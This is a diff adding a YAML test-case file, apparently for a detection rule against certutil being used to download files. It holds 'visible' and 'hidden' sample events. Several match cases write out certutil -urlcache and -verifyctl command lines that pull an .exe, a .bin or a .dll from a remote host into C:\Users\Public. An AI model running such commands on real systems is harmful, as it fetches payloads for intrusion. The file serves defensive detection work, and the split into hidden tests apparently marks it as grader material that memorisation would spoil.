@@ -1,0 +1,39 @@
+description: "certutil bilan internetdan fayl yuklab olish"
+visible:
+  - expect: match
+    note: urlcache -split download
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'certutil -urlcache -split -f http://203.0.113.10/a.exe C:\Users\Public\a.exe'
+  - expect: no_match
+    note: hashfile
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'certutil -hashfile C:\temp\setup.exe SHA256'
+hidden:
+  - expect: match
+    note: urlcache without -split, upper-case image
+    event:
+      Image: 'C:\Windows\System32\CERTUTIL.EXE'
+      ParentImage: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: 'CERTUTIL.EXE -urlcache -f https://files.example.net/p.bin C:\Users\Public\p.bin'
+  - expect: match
+    note: verifyctl download variant
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'certutil -verifyctl -f -split http://203.0.113.10/b.dll'
+  - expect: no_match
+    note: decode local file
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'certutil -decode C:\temp\a.b64 C:\temp\a.txt'
+  - expect: no_match
+    note: view store
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'certutil -viewstore my'
